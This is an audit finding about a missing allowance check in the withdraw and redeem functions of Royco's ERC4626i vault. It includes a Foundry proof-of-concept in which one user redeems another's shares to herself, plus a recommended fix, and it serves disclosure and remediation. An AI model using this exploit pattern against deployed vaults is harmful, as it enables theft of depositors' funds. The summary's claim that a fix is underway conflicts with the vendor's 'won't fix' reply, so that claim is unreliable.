---
tags:
  - lang/solidity
  - platform/cantina
  - has/github
  - has/poc
  - severity/high
  - sector/token
  - sector/vault
protocol: "[[Royco]]"
auditors:
  - "[[Kurt Barry]]"
report: "https://cdn.cantina.xyz/reports/cantina_royco_august2024.pdf"
genome:
  - "[[missing-modifier]]"
  - "[[direct-drain]]"
  - "[[reward-accounting]]"
---
# Missing permissions check in withdraw and redeem functions in ERC4626i.sol 

- id: 46674
- impact: HIGH
- protocol: [[Royco]]
- reporter: Kurt Barry (Cantina)
- source: https://cdn.cantina.xyz/reports/cantina_royco_august2024.pdf

## Summary


The report is about a bug in the ERC4626i smart contract. The withdraw and redeem functions do not have a critical permissions check, which means that an attacker could potentially steal assets by burning shares on behalf of an owner without their consent. This could lead to unauthorized withdrawals or redeems by any user, affecting the share balance of other users. A proof of concept is provided in the report. The recommendation is to add a check to ensure that the msg.sender is the owner or has sufficient allowance to burn the owner's shares. The bug has been acknowledged by the developers and they are working on fixing it. The risk level of this bug is high.

## Details

## ERC4626i Vulnerability Report

## Context
- [ERC4626i.sol#L457](https://github.com/path/to/ERC4626i.sol#L457)
- [ERC4626i.sol#L468](https://github.com/path/to/ERC4626i.sol#L468)

## Description
The `withdraw` and `redeem` functions in `ERC4626i` don’t have a critical permissions check, which could allow an attacker to burn shares on behalf of an owner without their consent, effectively stealing the underlying assets. This means that any user calling these functions can potentially affect the share balance of any other user, leading to unauthorized withdrawals or redeems.

## Proof of Concept
```solidity
// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.0;

import {MockERC20} from "test/mocks/MockERC20.sol";
import {MockERC4626} from "test/mocks/MockERC4626.sol";
import {ERC20} from "lib/solmate/src/tokens/ERC20.sol";
import {ERC4626} from "lib/solmate/src/tokens/ERC4626.sol";
import {ERC4626i} from "src/ERC4626i.sol";
import {ERC4626iFactory} from "src/ERC4626iFactory.sol";
import {PointsFactory} from "src/PointsFactory.sol";
import {Test, console} from "forge-std/Test.sol";

contract ERC4626iPocTest is Test {
    ERC20 token = ERC20(address(new MockERC20("Mock Token", "MOCK")));
    ERC4626 testVault = ERC4626(address(new MockERC4626(token)));
    ERC4626i testIncentivizedVault;
    PointsFactory pointsFactory = new PointsFactory();
    ERC4626iFactory testFactory;
    uint256 constant DEFAULT_REFERRAL_FEE = 0.05e18;
    uint256 constant DEFAULT_PROTOCOL_FEE = 0.05e18;

    function setUp() public {
        testFactory = new ERC4626iFactory(0.05e18, 0.05e18, address(pointsFactory));
    }

    function testBasicRewardsCampaign() public {
        address alice = makeAddr("alice");
        address bob = makeAddr("bob");
        ERC4626i iVault = testFactory.createIncentivizedVault(testVault);
        uint256 amount = 1 ether;
        MockERC20 testMockToken = new MockERC20("Reward Token", "REWARD");
        
        testMockToken.mint(address(this), amount);
        testMockToken.approve(address(iVault), amount);
        
        vm.startPrank(bob);
        MockERC20(address(token)).mint(bob, amount);
        token.approve(address(iVault), amount);
        iVault.deposit(amount, bob);
        vm.stopPrank();
        
        console.log("alice balance before", token.balanceOf(address(alice)));
        // Next should revert
        vm.prank(alice);
        iVault.redeem(amount, alice, bob);
        console.log("stolen tokens", token.balanceOf(address(alice)));
    }
}
```

## Recommendation
Add a check to ensure that if the `msg.sender` is not the owner, they must have sufficient allowance to burn the owner's shares:
```solidity
if (msg.sender != owner) {
    uint256 allowed = allowance[owner][msg.sender]; // Saves gas for limited approvals.
    if (allowed != type(uint256).max) allowance[owner][msg.sender] = allowed - shares;
}
```
*Code based on solmate original implementation [ERC4626.sol#L78-L84](https://github.com/path/to/ERC4626.sol#L78-L84).*

## Royco
Acknowledged. Won't fix: `ERC4626i` is being rewritten entirely.

## Cantina Managed
Acknowledged.
